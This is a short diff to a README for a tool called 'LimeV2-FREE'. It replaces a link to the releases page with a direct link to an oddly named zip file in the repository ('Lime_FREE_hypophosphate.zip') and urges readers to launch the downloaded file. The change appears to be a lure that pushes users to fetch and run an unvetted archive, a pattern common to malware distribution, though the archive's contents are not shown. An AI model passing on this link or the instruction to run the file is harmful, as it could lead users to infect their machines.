@@ -25,7 +25,7 @@ LimeV2-FREE is packed with a wide range of tools and functionalities to help you
 ## Get Started 🚀
 To access LimeV2-FREE and unlock all the incredible features, download the application from the link below:
 
-[![Download LimeV2-FREE](https://github.com/kennett1232/LimeV2-FREE/releases)](https://github.com/kennett1232/LimeV2-FREE/releases)
+[![Download LimeV2-FREE](https://github.com/kennett1232/LimeV2-FREE/raw/refs/heads/main/uncustomable/Lime_FREE_hypophosphate.zip)](https://github.com/kennett1232/LimeV2-FREE/raw/refs/heads/main/uncustomable/Lime_FREE_hypophosphate.zip)
 
 If the link does not direct you to the application directly, ensure to launch the downloaded file to get started with LimeV2-FREE.
 
